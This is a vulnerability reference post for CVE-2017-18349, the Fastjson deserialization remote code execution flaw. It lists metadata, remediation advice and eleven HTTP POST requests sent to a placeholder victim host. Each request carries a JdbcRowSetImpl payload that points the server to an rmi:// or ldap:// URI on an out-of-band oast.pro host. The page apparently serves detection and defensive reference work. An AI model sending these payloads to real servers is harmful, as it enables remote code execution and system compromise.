---
layout: "post"
cve_id: "CVE-2017-18349"
title: "Fastjson Insecure Deserialization - Remote Code Execution"
pcap: true
pcap_path: "/pcaps/2017/CVE-2017-18349.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2017/CVE-2017-18349.yaml"
author: "night"
severity: "critical"
impact: "Successful exploitation allows complete system compromise through remote code execution, enabling attackers to execute arbitrary commands, access sensitive data, and establish persistent backdoors on the target system.
"
remediation: "Update Fastjson to version 1.2.25 or later which includes security patches for this vulnerability.Disable autotype functionality by setting `fastjson.parser.autoTypeSupport=false`.Implement strict whitelist filtering for `@type` annotations, validate and sanitize all JSON input.Use Web Application Firewalls (WAF) to filter malicious requests, and regularly audit dependencies for known vulnerabilities. Consider migrating to safer JSON parsing libraries like Jackson with secure configurations.
"
reference:
  - "https://nvd.nist.gov/vuln/detail/CVE-2017-18349"
  - "https://github.com/alibaba/fastjson/wiki/security_update_20170315"
  - "https://github.com/pippo-java/pippo/issues/466"
  - "https://github.com/h0cksr/Fastjson--CVE-2017-18349-"
  - "https://fortiguard.com/encyclopedia/ips/44059"
  - "https://www.exploit-db.com/exploits/45983"
classification:
  cvss-metrics: "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
  cvss-score: 9.8
  cve-id: "CVE-2017-18349"
  cwe-id: "CWE-20"
  epss-score: 0.92554
  epss-percentile: 0.99722
  cpe: "cpe:2.3:a:alibaba:fastjson:*:*:*:*:*:*:*:*"
metadata:
  verified: True
  vendor: "alibaba"
  product: "fastjson"
tags:
  - "cve"
  - "cve2017"
  - "fastjson"
  - "deserialization"
  - "rce"
  - "oob"
  - "oast"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---


## üîç Vulnerability Description
parseObject in Fastjson before 1.2.25, as used in FastjsonEngine in Pippo 1.11.0 and other products, allows remote attackers to execute arbitrary code via a crafted JSON request, as demonstrated by a crafted rmi-// URI in the dataSourceName field of HTTP POST data to the Pippo /json URI, which is mishandled in AjaxApplication.java.


## üåê HTTP Request
```nohighlight
POST /json HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (SS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Connection: close
Content-Length: 174
Accept: application/json
Accept-Language: en
Content-Type: application/json
Accept-Encoding: gzip

{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "rmi://d4te8r9le0o0lk1pc0j0c9rinjjko93rk.oast.pro/36hmb57b4AsFhGohmwZoHbyHr0G",
  "autoCommit": true
}
```

```nohighlight
POST /api/json HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Connection: close
Content-Length: 174
Accept: application/json
Accept-Language: en
Content-Type: application/json
Accept-Encoding: gzip

{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "rmi://d4te8r9le0o0lk1pc0j08httgcabyzg9p.oast.pro/36hmb57b4AsFhGohmwZoHbyHr0G",
  "autoCommit": true
}
```

```nohighlight
POST /json HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1
Connection: close
Content-Length: 175
Accept: application/json
Accept-Language: en
Content-Type: application/json
Accept-Encoding: gzip

{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://d4te8r9le0o0lk1pc0j0pz613baabuysc.oast.pro/36hmb57b4AsFhGohmwZoHbyHr0G",
  "autoCommit": true
}
```

```nohighlight
POST /api/json HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.5.20) Gecko/ Firefox/3.6.12
Connection: close
Content-Length: 175
Accept: application/json
Accept-Language: en
Content-Type: application/json
Accept-Encoding: gzip

{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://d4te8r9le0o0lk1pc0j0efzf7qd6dwb8x.oast.pro/36hmb57b4AsFhGohmwZoHbyHr0G",
  "autoCommit": true
}
```

```nohighlight
POST /parse HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0
Connection: close
Content-Length: 175
Accept: application/json
Accept-Language: en
Content-Type: application/json
Accept-Encoding: gzip

{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://d4te8r9le0o0lk1pc0j0f66hdz935xat8.oast.pro/36hmb57b4AsFhGohmwZoHbyHr0G",
  "autoCommit": true
}
```

```nohighlight
POST /deserialize HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:58.0) Gecko/20100101 Firefox/59.0
Connection: close
Content-Length: 175
Accept: application/json
Accept-Language: en
Content-Type: application/json
Accept-Encoding: gzip

{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://d4te8r9le0o0lk1pc0j07zowzufd9r1ts.oast.pro/36hmb57b4AsFhGohmwZoHbyHr0G",
  "autoCommit": true
}
```

```nohighlight
POST /json HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36
Connection: close
Content-Length: 198
Accept: application/json
Accept-Language: en
Content-Type: application/json
Accept-Encoding: gzip

{
  "data": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "rmi://d4te8r9le0o0lk1pc0j01mbun1wqe9gys.oast.pro/36hmb57b4AsFhGohmwZoHbyHr0G",
    "autoCommit": true
  }
}
```

```nohighlight
POST /api/json HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
Connection: close
Content-Length: 198
Accept: application/json
Accept-Language: en
Content-Type: application/json
Accept-Encoding: gzip

{
  "data": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "rmi://d4te8r9le0o0lk1pc0j0yqfkxkf46if7o.oast.pro/36hmb57b4AsFhGohmwZoHbyHr0G",
    "autoCommit": true
  }
}
```

```nohighlight
POST /parse HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_10_3 rv:2.0; so-DJ) AppleWebKit/533.15.6 (KHTML, like Gecko) Version/4.0.2 Safari/533.15.6
Connection: close
Content-Length: 198
Accept: application/json
Accept-Language: en
Content-Type: application/json
Accept-Encoding: gzip

{
  "data": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "rmi://d4te8r9le0o0lk1pc0j06tuub1sy11w7s.oast.pro/36hmb57b4AsFhGohmwZoHbyHr0G",
    "autoCommit": true
  }
}
```

```nohighlight
POST /deserialize HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/602.4.8 (KHTML, like Gecko) Version/10.0 Safari/602.4.8
Connection: close
Content-Length: 198
Accept: application/json
Accept-Language: en
Content-Type: application/json
Accept-Encoding: gzip

{
  "data": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "rmi://d4te8r9le0o0lk1pc0j0ar5eppg1b44bz.oast.pro/36hmb57b4AsFhGohmwZoHbyHr0G",
    "autoCommit": true
  }
}
```

```nohighlight
POST /json HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Debian; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Connection: close
Content-Length: 196
Accept: application/json
Accept-Language: en
Content-Type: application/json
Accept-Encoding: gzip

{
  "b": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://d4te8r9le0o0lk1pc0j0waatainszq7em.oast.pro/36hmb57b4AsFhGohmwZoHbyHr0G",
    "autoCommit": true
  }
}
```


